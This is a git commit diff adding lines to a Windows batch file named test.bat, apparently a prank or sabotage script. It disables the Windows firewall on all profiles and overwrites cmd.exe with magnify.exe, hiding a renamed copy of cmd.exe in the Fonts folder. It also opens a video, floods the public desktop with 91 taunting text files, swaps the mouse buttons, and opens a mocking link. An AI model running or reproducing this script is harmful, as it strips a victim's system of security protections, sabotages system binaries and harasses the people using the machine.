e7a5493df4122a70ed7063c93faaefe5b51c5a51
voitheiattk <80133987+voitheiattk@users.noreply.github.com>
2021-03-05 20:12:43 -0500

    Update test.bat
    added more dank memes!  : )

--- test.bat
+++ test.bat
@@ -1,3 +1,112 @@
 REM disable firewall
 netsh advfirewall set currentprofile state off
 netsh advfirewall set allprofiles state off
+
+REM need to figure out how to turn firewall off every once in a while
+
+REM replace cmd.exe with something else, maybe magnifer, make backup cmd.exe in c:/windows/fonts
+copy "C:\Windows\System32\cmd.exe" "C:\Windows\Fonts\notcmd.exe"
+copy "C:\Windows\System32\magnify.exe" "C:\Windows\System32\cmd.exe"
+
+REM https://www.youtube.com/watch?v=QTT5iHCHSn0 coconut mall
+start https://www.youtube.com/watch?v=QTT5iHCHSn0
+
+REM cover the desktop with coconut mall, not in a for loop because bat hard and i dont know how to
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall0.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall1.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall2.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall3.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall4.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall5.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall6.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall7.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall8.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall9.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall10.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall11.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall12.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall13.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall14.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall15.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall16.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall17.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall18.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall19.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall20.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall21.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall22.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall23.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall24.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall25.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall26.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall27.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall28.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall29.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall30.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall31.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall32.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall33.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall34.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall35.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall36.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall37.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall38.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall39.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall40.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall41.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall42.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall43.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall44.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall45.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall46.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall47.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall48.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall49.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall50.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall51.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall52.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall53.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall54.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall55.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall56.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall57.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall58.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall59.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall60.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall61.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall62.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall63.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall64.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall65.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall66.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall67.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall68.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall69.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall70.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall71.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall72.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall73.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall74.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall75.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall76.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall77.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall78.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall79.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall80.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall81.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall82.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall83.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall84.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall85.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall86.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall87.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall88.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall89.txt
+echo You just got COCONUT MALLED! Share this with all your friends to totally COCONUT MALL them! > C:\Users\Public\Desktop\coconutmall90.txt
+
+REM swap mouse buttons
+Rundll32 user32,SwapMouseButton
+
+REM lmgtfy "how do i unhack myself"
+start https://lmgtfy.app/?q=how+do+i+unhack+myself
